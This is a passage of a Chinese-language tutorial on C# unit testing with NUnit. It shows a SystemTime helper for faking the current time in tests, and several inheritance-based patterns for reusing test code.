<h3 id="注入横切关注点"><a href="#注入横切关注点" class="headerlink" title="注入横切关注点"></a>注入横切关注点</h3><p>&emsp;&emsp;当需要处理类似时间管理、异常或日志的横切关注点时，使用它们的地方会非常多，如果把它们实现成可注入的，产生的代码会很容易测试，但却很难阅读和理解。这里我们来看一个例子，假设应用程序使用当前时间进行写日志，相关代码如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">TimeLogger</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">CreateMessage</span>(<span class="params"><span class="keyword">string</span> info</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> DateTime.Now.ToShortDateString() + <span class="string">" "</span> + info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;为了使这段代码容易测试，如果使用之前的依赖注入技术，那么我们需要创建一个 ITimeProvider 接口，还必须在每个用到<code>DateTime</code>的地方使用到这个接口。这样做非常耗时，实际上，还有更直接的方法解决这个问题。  </p>
<p>&emsp;&emsp;<strong><em>Step1.</em></strong> 创建一个名为 SystemTime 的定制类，在所有的产品代码里边使用这个定制类，而非标准的内建类 DateTime。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SystemTime</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DateTime _date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Set</span>(<span class="params">DateTime custom</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _date = custom;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _date = DateTime.MinValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DateTime Now</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果设置了时间，SystemTime 就返回假时间，否则返回真时间</span></span><br><span class="line">            <span class="keyword">if</span> (_date != DateTime.MinValue)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> _date;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> DateTime.Now;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;阅读这段代码，其中有一个小技巧：SystemTime 类提供一个特殊方法 Set，它会修改系统中的当前时间，也就是说，每个使用这个 SystemTime 类的人看到的都是你指定的日期和时间。有了这样的代码，每个使用这个 SystemTime 类的人看到的都会是你指定的日期和时间。  </p>
<p>&emsp;&emsp;<strong><em>Step2.</em></strong> 在测试项目中使用 SystemTime 进行测试。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TimeLoggerTests</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SettingSystemTime_Always_ChangesTime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        SystemTime.Set(<span class="keyword">new</span> DateTime(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">string</span> output = TimeLogger.CreateMessage(<span class="string">"a"</span>);</span><br><span class="line"></span><br><span class="line">        StringAssert.Contains(<span class="string">"2000/1/1"</span>, output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 在每个测试结束时重置日期</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    [<span class="meta">TearDown</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AfterEachTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        SystemTime.Reset();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在测试中，我们首先假定设置一个日期，然后进行断言。并且<strong>借助<code>TearDown</code>方法，确保当前测试<code>不会改变</code>其他测试的值。</strong></p>
<blockquote>
<p><strong>Note：</strong>这样做的好处就在于不用注入一大堆接口，我们所付出的代价仅仅在于在测试类中加入一个简单的<code>[TearDown]</code>方法，确保当前测试不会改变其他测试的值。</p>
</blockquote>
<h3 id="使用继承使测试代码可重用"><a href="#使用继承使测试代码可重用" class="headerlink" title="使用继承使测试代码可重用"></a>使用继承使测试代码可重用</h3><p>&emsp;&emsp;推荐大家在测试代码中使用继承机制，通过实现基类，可以较好地展现面向对象的魔力。在实践中，一般有三种模式会被使用到：  </p>
<p>（1）抽象测试基础结构类模式</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 测试类集成模式</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BaseTestsClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 重构为通用可读的工具方法，由派生类使用</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>FakeLogger<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ILogger <span class="title">FakeTheLogger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        LoggingFacility.Logger = Substitute.For&lt;ILogger&gt;();</span><br><span class="line">        <span class="keyword">return</span> LoggingFacility.Logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">TearDown</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ClearLogger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// 测试之间要重置静态资源</span></span><br><span class="line">        LoggingFacility.Logger = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerTests</span> : <span class="title">BaseTestsClass</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_EmptyFile_ThrowsException</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// 调用基类的辅助方法</span></span><br><span class="line">        FakeTheLogger();</span><br><span class="line"></span><br><span class="line">        LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">        analyzer.Analyze(<span class="string">"myemptyfile.txt"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试方法的其余部分</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用此模式要注意继承最好不要超过一层，如果继承层数过多，不仅可读性急剧下降，编译也很容易出错。  </p>
<p>（2）测试类类模板模式</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 测试模板类模式</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">TemplateStringParserTests</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_SingleDigit_Found</span>(<span class="params"></span>)</span>;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithMinorVersion_Found</span>(<span class="params"></span>)</span>;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithRevision_Found</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">XMLStrignParserTests</span> : <span class="title">TemplateStringParserTests</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> IStringParser <span class="title">GetParser</span>(<span class="params"><span class="keyword">string</span> input</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> XMLStringParser(input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_SingleDigit_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IStringParser parser = GetParser(<span class="string">"&lt;Header&gt;1&lt;/Header&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(<span class="string">"1"</span>, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithMinorVersion_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IStringParser parser = GetParser(<span class="string">"&lt;Header&gt;1.1&lt;/Header&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(<span class="string">"1.1"</span>, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithRevision_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IStringParser parser = GetParser(<span class="string">"&lt;Header&gt;1.1.1&lt;/Header&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(<span class="string">"1.1"</span>, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用此模式可以确保开发者不会遗忘重要的测试，基类包含了抽象的测试方法，派生类必须实现这些抽象方法。  </p>
<p>（3）抽象测试驱动类模式</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 抽象“填空”测试驱动类模式</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">FillInTheBlankStringParserTests</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 返回接口的抽象方法</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> IStringParser <span class="title">GetParser</span>(<span class="params"><span class="keyword">string</span> input</span>)</span>;</span><br><span class="line">    <span class="comment">// 抽象输入方法（属性），为派生类提供特定格式的数据</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> HeaderVersion_SingleDigit &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> HeaderVersion_WithMinorVersion &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> HeaderVersion_WithRevision &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    <span class="comment">// 如果需要，预先为派生类定义预期的输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">const</span> <span class="keyword">string</span> EXPECTED_SINGLE_DIGIT = <span class="string">"1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">const</span> <span class="keyword">string</span> EXPECTED_WITH_MINORVERSION = <span class="string">"1.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">const</span> <span class="keyword">string</span> EXPECTED_WITH_REVISION = <span class="string">"1.1.1"</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_SingleDigit_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = HeaderVersion_SingleDigit;</span><br><span class="line">        IStringParser parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(EXPECTED_SINGLE_DIGIT, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithMinorVersion_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = HeaderVersion_WithMinorVersion;</span><br><span class="line">        IStringParser parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(EXPECTED_WITH_MINORVERSION, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithRevision_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = HeaderVersion_WithRevision;</span><br><span class="line">        IStringParser parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">string</span> versionFromHeader = parser.GetTextVersionFromHeader();</span><br><span class="line">        Assert.AreEqual(EXPECTED_WITH_REVISION, versionFromHeader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DBLogStringParserTests : GenericParserTests&lt;DBLogStringParser&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderSingleDigit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithMinorVersion</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1.1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithRevision</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1.1.1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此模式在基类中实现测试方法，并提供派生类可以实现的抽象方法<strong>钩子</strong>。当然，只是大部分的测试代码在基类中，派生类也可以加入自己的特殊测试。  </p>
<p>&emsp;&emsp;此模式的要点在于：你不是具体地测试一个类，而是测试产品代码中的一个接口或者基类。  </p>
<p>&emsp;&emsp;当然，在 .NET 中我们也可以通过泛型来实现此模式，例如下面的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">public abstract class GenericParserTests&lt;T&gt; where T : IStringParser // 01. 定义参数的泛型约束</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> <span class="title">GetInputHeaderSingleDigit</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithMinorVersion</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithRevision</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 02. 返回泛型变量而非接口</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> T <span class="title">GetParser</span>(<span class="params"><span class="keyword">string</span> input</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// 03. 返回泛型</span></span><br><span class="line">        <span class="keyword">return</span> (T)Activator.CreateInstance(<span class="keyword">typeof</span>(T), input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_SingleDigit_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = GetInputHeaderSingleDigit();</span><br><span class="line">        T parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> result = parser.HasCorrectHeader();</span><br><span class="line">        Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithMinorVersion_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = GetInputHeaderWithMinorVersion();</span><br><span class="line">        T parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> result = parser.HasCorrectHeader();</span><br><span class="line">        Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestGetStringVersionFromHeader_WithRevision_Found</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> input = GetInputHeaderWithRevision();</span><br><span class="line">        T parser = GetParser(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> result = parser.HasCorrectHeader();</span><br><span class="line">        Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DBLogStringParserTests : GenericParserTests&lt;DBLogStringParser&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderSingleDigit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithMinorVersion</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1.1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">GetInputHeaderWithRevision</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Header;1.1.1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="优秀单元测试的支柱"><a href="#优秀单元测试的支柱" class="headerlink" title="优秀单元测试的支柱"></a>优秀单元测试的支柱</h2><p>要编写优秀的单元测试，它们应该同时具有 <strong>可靠性</strong>、<strong>可维护性</strong> 及 <strong>可读性</strong>。</p>
<h3 id="编写可靠的测试"><a href="#编写可靠的测试" class="headerlink" title="编写可靠的测试"></a>编写可靠的测试</h3><p>一个可靠的测试能让你觉得自己对事态了如指掌，能够从容应对。以下是一些指导原则和技术：  </p>
<p>（1）决定何时删除或修改测试<br>&emsp;&emsp;一旦测试写好并通过，通常我们不应该修改或删除这些测试，因为它们是我们得绿色保护网。但是，有时候我们还是需要修改或者删除测试，所以需要理解什么情况下修改或删除测试会带来问题，什么情况下又是合理的。一般来说，如果有<strong>产品缺陷、测试缺陷、语义或者API更改或者是由于冲突或无效测试</strong>，我们需要修改和删除测试代码。  </p>
<p>（2）避免测试中的逻辑<br>&emsp;&emsp;随着测试中逻辑的增多，出现测试缺陷的几率就会呈现指数倍的增长。如果单元测试中包含了下列语句就是包含了不应该有的逻辑：</p>
<ul>
